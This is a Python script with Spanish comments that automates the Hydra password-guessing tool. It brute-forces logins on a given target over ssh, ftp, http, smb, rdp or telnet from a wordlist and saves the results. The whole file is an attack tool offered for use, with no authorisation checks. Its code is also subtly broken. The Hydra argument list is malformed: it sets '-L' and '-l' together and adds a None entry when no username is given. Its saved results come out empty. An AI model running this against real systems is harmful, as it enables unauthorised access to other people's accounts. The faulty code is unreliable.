#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Script de Fuerza Bruta con Hydra
Este script automatiza el uso de Hydra para realizar ataques de fuerza bruta
en diferentes servicios y protocolos.
"""

import os
import sys
import subprocess
import logging
import argparse
from typing import List, Optional
from datetime import datetime

class HydraBrute:
    def __init__(self, target: str, service: str, username: Optional[str] = None):
        """
        Inicializa el ataque de fuerza bruta
        
        Args:
            target (str): IP o dominio del objetivo
            service (str): Servicio a atacar (ssh, ftp, http, etc.)
            username (str, optional): Nombre de usuario a utilizar
        """
        self.target = target
        self.service = service
        self.username = username
        self.results_file = f"hydra_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        # Configurar logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        
    def validar_servicio(self) -> bool:
        """
        Valida que el servicio sea soportado por Hydra
        
        Returns:
            bool: True si el servicio es válido
        """
        servicios_validos = ['ssh', 'ftp', 'http', 'https', 'smb', 'rdp', 'telnet']
        return self.service.lower() in servicios_validos
        
    def ejecutar_ataque(self, wordlist: str, puerto: Optional[int] = None) -> bool:
        """
        Ejecuta el ataque de fuerza bruta
        
        Args:
            wordlist (str): Ruta al archivo de wordlist
            puerto (int, optional): Puerto específico a atacar
            
        Returns:
            bool: True si el ataque fue exitoso
        """
        try:
            if not self.validar_servicio():
                logging.error(f"Servicio {self.service} no soportado")
                return False
                
            if not os.path.isfile(wordlist):
                logging.error(f"El archivo de wordlist {wordlist} no existe")
                return False
                
            # Construir comando de Hydra
            cmd = ['hydra', '-L', wordlist if not self.username else '-l', self.username]
            
            if self.username:
                cmd.extend(['-P', wordlist])
            else:
                cmd.extend(['-P', wordlist])
                
            if puerto:
                cmd.extend(['-s', str(puerto)])
                
            cmd.extend([self.target, self.service])
            
            # Ejecutar Hydra
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Monitorear salida
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    logging.info(output.strip())
                    
            # Guardar resultados
            with open(self.results_file, 'w') as f:
                f.write(process.stdout.read())
                
            return True
            
        except Exception as e:
            logging.error(f"Error durante el ataque: {str(e)}")
            return False
            
    def mostrar_resultados(self):
        """Muestra los resultados del ataque"""
        try:
            with open(self.results_file, 'r') as f:
                print("\nResultados del ataque:")
                print("-" * 50)
                print(f.read())
        except Exception as e:
            logging.error(f"Error al mostrar resultados: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description='Script de Fuerza Bruta con Hydra')
    parser.add_argument('target', help='IP o dominio del objetivo')
    parser.add_argument('service', help='Servicio a atacar (ssh, ftp, http, etc.)')
    parser.add_argument('wordlist', help='Archivo de wordlist a utilizar')
    parser.add_argument('--username', help='Nombre de usuario específico')
    parser.add_argument('--port', type=int, help='Puerto específico')
    
    args = parser.parse_args()
    
    brute = HydraBrute(args.target, args.service, args.username)
    
    # Ejecutar ataque
    if brute.ejecutar_ataque(args.wordlist, args.port):
        brute.mostrar_resultados()
    else:
        logging.error("El ataque falló")

if __name__ == "__main__":
    main() 